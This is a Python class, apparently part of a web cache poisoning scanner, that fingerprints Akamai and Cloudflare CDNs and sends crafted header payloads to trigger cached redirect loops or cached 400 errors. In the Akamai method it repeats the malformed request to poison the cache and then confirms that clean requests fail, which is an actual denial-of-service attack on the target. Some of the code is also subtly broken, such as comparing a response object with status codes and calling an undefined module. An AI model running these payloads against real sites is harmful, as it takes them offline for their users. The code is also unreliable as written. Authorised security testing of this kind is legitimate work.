#! /usr/bin/env python3
# -*- coding: utf-8 -*-

class analyze_cdn:
    """
    Cloudflare:
        X-Forwarded-Proto: http => 301/302/303 + CF-Cache-Status: HIT
    Akamai:
        ": 1 => 400 + Server-Timing: cdn-cache; desc=HIT
    #TODO
    """

    def get_cdn(self, req_main, url, s):
        """
        Check what is the reverse proxy/waf/cached server... and test based on the result
        """
        print("\033[36m ├ CDN analyse\033[0m")
        cdns = {
        "Akamai": ["Akamai", "X-Akamai","X-Akamai-Transformed", "AkamaiGHost"],
        "Cloudflare": ["cf-ray", "cloudflare", "Cf-Cache-Status", "Cf-Ray"],
        #"CacheFly": "",
        #"Fastly": "",
        }
        for c in cdns:
            for v in cdns[c]:
                if v in req_main.text or v in req_main.headers:
                    return c;


    def Cloudflare(self, url, s):
        print("\033[36m --├ Cloudflare\033[0m")
        headers = {"X-Forwarded-Proto": "nohttps"}
        cf_loop = s.get(url, headers=headers, verify=False, timeout=6)
        if cf_loop in [301, 302, 303]:
            print(cf_loop.headers)
            if "CF-Cache-Status: HIT" in cf_loop.headers:
                print("   \033[32m└──+\033[0m Potential redirect loop exploit possible with \033[32m{}\033[0m payload".format(headers))


    def Akamai(self, url, s):
        print("\033[36m --├ Akamai\033[0m")
        headers = [{'"': "1"}, {"\\":"1"}]
        url = "{}?aka_loop=123".format(url)
        for h in headers:
            try:
                aka_loop = s.get(url, headers=h, verify=False, timeout=10)
                if aka_loop.status_code == 400:
                    for al in aka_loop.headers:
                        if al == "Server-Timing" and "desc=HIT" in aka_loop.headers[al]:
                            for al in range(10):
                                requests.get(url, headers=h, verify=False, timeout=10)
                aka_verif = requests.get(url, verify=False, timeout=10)
                if aka_verif.status_code == 400:
                    print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | Akamai redirect loop | \033[34m{}\033[0m | PAYLOAD: {}".format(url, h))
            except:
                print(" └── Error with this payload please check manually with this header: {}".format(headers))

    def envoy(self, url, s):
        print("\033[36m --├ Envoy\033[0m")
        print("TODO")
